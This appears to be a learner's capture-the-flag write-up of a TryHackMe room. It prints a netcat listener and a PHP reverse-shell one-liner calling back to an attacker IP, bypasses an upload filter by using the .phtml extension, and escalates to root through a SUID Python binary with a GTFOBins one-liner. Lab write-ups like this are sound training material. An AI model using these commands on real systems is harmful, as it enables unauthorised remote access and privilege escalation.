## 💥Exploitation 
Upon accessing `/uploads`, it does not seem like there is a place for me to upload a reverse shell, so I switched to the `/panel` directory, which showed to following:

![](attachments/Pasted%20image%2020260209192624.png)

My hypothesis is that files I upload at `/panel` will be saved at `/uploads`, which I can then access to run it. So I tried uploading a reverse shell.

From the [Wappalyzer](#Wappalyzer) results, I found that the machine is using PHP, so I got a [php reverse shell](#pentestmonkey) from pentestmonkey. 

I first start a netcat listener. 
`nc -vlnp 9999`

`php -r '$sock=fsockopen("192.168.169.198",9999);exec("/bin/sh -i <&3 >&3 2>&3");'`

Unfortunately, when uploading the file, the following appears.

## Attempt 3
After numerous testing on my own kali installation, and also on the TryHackMe attackbox, I could not figure out why I could not get a reverse shell on the machine, I first assumed it was because I was using the on line cheat sheet, but I also failed using the tool, I then tried it on TryHackMe's own attack box but was also unable to get a shell. 

What worked was changing the extension from `.php4` to `.phtml` which can be found on [PHP_alternative_extensions](#PHP_alternative_extensions). 

After getting a shell, there is a flag in users.txt. Which I found using `find`.

`find . -name "user.txt" 2>/dev/null`

Note: `2>/dev/null` is used to redirect errors

## Privilege Escalation
### SUID
According to the TryHackMe page I can escalate through a file with SUID bit set.

I tried using `find / -type f -perm -04000 -ls 2>/dev/null` but could not seem to get the flag for the question. Apparently, the file name I found was `/usr/bin/python2.7` but TryHackMe accerpts `/usr/bin/python`.

Searching for python is [Gtfobins for python with SUID](#Gtfobins), I used the Shell function to get a root shell.

````
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
````

I successfully got a root shell.
![](attachments/Pasted%20image%2020260209192645.png)

Since TryHackMe states that the flag is in root.txt, I simply used `find` to find the flag.

`find -name "root.txt" 2>/dev/null`
